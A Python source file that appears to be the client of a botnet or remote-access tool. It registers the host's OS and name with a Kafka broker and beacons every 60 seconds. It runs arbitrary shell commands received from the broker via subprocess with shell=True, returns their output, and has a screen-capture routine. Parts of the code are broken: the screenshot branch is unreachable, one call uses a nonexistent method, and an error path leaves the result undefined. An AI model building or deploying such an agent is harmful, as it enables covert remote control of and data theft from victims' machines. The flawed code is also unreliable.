import platform
import time
from kafka_producer import produce_message
from kafka_consumer import KafkaConsumerDaemon
import subprocess
import uuid
import schedule
from mss import mss
from PIL import Image

def handle_callback(task, group_id):
    """ Handle the callback logic based on the consumed message. """
    print(f'Received order {task}')
    if task['actionType'] == 'exec_script' or task['actionType'] == 'os_exec_script':
        print(f'Received script execution order, proceeding to execute it')
        # Execute the task
        script_value = task['parameters']['value']
        try:
            # Execute the script
            if task['actionType'] == 'exec_script':
                # For exec_script, use subprocess.run
                result = subprocess.run(script_value, shell=True, check=True, text=True, capture_output=True)
                print(f'Script output: {result.stdout}')
                result_str = result.stdout
            elif task['actionType'] == 'screenshot':
                # For creates an screenshot, use the system command and sends in base64 format
                result_str = shot_screenshot()
                print(f'Screenshot output: {result_str}')
            else:
                result = script_value.system(script_value)
                print(f'Script output: {result.stdout}')
                result_str = result.stdout
        except subprocess.CalledProcessError as e:
            print(f'Script execution failed: {e.stderr}')
            result = e.stderr
            
        # Produce a callback message
        callback_task = {
            'actionType': 'callback',
            'parameters': {
                'groupId': group_id,
                'taskId': task['id']
            },
            'result': result_str
        }
        produce_message(bootstrap_servers, 'callback', callback_task)

def shot_screenshot():
    """ Take a screenshot and return the image in base64 format. """
    try:
        with mss() as sct:
            # Capture the screenshot
            sct_img = sct.grab(sct.monitors[0])  # monitors[0] represents all monitors combined
            
            # Convert to PIL Image
            img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")

            return img
    except Exception as e:
        print(f"Error taking screenshot: {e}")
        return str(e)

""" Produce a heartbeat message to the specified topic. """
def produce_heart_beat(bootstrap_servers, topic, bot_id):
    print(f"Heartbeat message produced to topic {topic}")
    heart_beat_task = {
        'actionType': 'heartbeat',
        'parameters': {
            'botId': bot_id
        },
        'result': "success"
    }
    produce_message(bootstrap_servers, "heartbeat", heart_beat_task)

def main(bootstrap_servers, topic):
    # Create and start the consumer daemon
    group_id = str(uuid.uuid4())
    consumer_daemon = KafkaConsumerDaemon(bootstrap_servers, topic, group_id, handle_callback)
    consumer_daemon.start()

    print(f"Kafka consumer opened successfully on topic {topic}")

    # Produce initial message with a unique group ID
    initial_task = {
        'id': '',
        'actionType': 'init',
        'parameters': {
            'groupId': group_id,
            'os': platform.platform(),
            'name': platform.node()
        },
        'result': "success"
    }
    produce_message(bootstrap_servers, "init", initial_task)
    print(f"Initial message produced to topic {topic} with group ID {group_id}")
    
    # Every 60 seconds we will send a heart beat message
    schedule.every(60).seconds.do(produce_heart_beat, bootstrap_servers, topic, group_id)
    print(f"Initialized scheduled heartbeat system for group ID {group_id}")

    try:
        # Keep the main thread alive
        while True:
            schedule.run_pending()
            time.sleep(1)  # Sleep for a short interval to prevent high CPU usage
            pass
    except KeyboardInterrupt:
        print("Stopping consumer...")
        consumer_daemon.stop()
        consumer_daemon.join()

def read_config_file(file_path):
    config = {}
    with open(file_path, 'r') as file:
        for line in file:
            line = line.strip()
            if line and not line.startswith('#'):  # Ignore comments and empty lines
                key, value = line.split('=', 1)
                config[key.strip()] = value.strip()
    return config

if __name__ == '__main__':
    # Read configuration from config.txt
    config = read_config_file('config.txt')
    
    if not config:
        print("Configuration file is empty or not found.")
        exit(1)

    bootstrap_servers = config.get('bootstrap_servers')
    topic = config.get('topic')

    main(bootstrap_servers, topic)
